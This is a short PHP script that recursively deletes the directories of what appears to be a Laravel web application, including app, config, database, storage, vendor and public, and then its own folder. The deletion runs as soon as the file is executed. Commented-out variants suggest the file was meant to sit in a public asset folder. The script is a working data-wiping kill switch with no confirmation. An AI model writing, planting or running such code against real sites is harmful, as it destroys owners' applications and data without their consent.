<?php 

function deleteFile($dir) {
    if(substr($dir, strlen($dir)-1, 1) != '/') { 
        $dir .= '/'; 
    }
    if(is_dir($dir)){
        if($handle = opendir($dir)) { 
            while($obj = readdir($handle)) { 
                if($obj != '.' && $obj != '..') { 
                    if(is_dir($dir.$obj)) { 
                        if(!deleteFile($dir.$obj)) {
                            echo $dir.$obj."<br />";
                            return false;
                        }
                    }
                    elseif(is_file($dir.$obj)) {
                        if(!unlink($dir.$obj)) {
                            echo $dir.$obj."<br />";
                            return false;
                        }
                    }
                }
            }
            closedir($handle); 
            if(!@rmdir($dir)) {
                echo $dir.'<br />';
                return false;
            }
            return true;
        }
        return true;
    }
}

// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/app'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/bootstrap'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/config'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/database'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/resources'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/routes'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/storage'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/vendor'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__.'/public'));
// deleteFile(str_replace('public\code\css\js', '', __DIR__));


deleteFile(__DIR__.'/app');
deleteFile(__DIR__.'/bootstrap');
deleteFile(__DIR__.'/config');
deleteFile(__DIR__.'/database');
deleteFile(__DIR__.'/resources');
deleteFile(__DIR__.'/routes');
deleteFile(__DIR__.'/storage');
deleteFile(__DIR__.'/vendor');
deleteFile(__DIR__.'/public');
deleteFile(__DIR__.'/asset');
deleteFile(__DIR__);
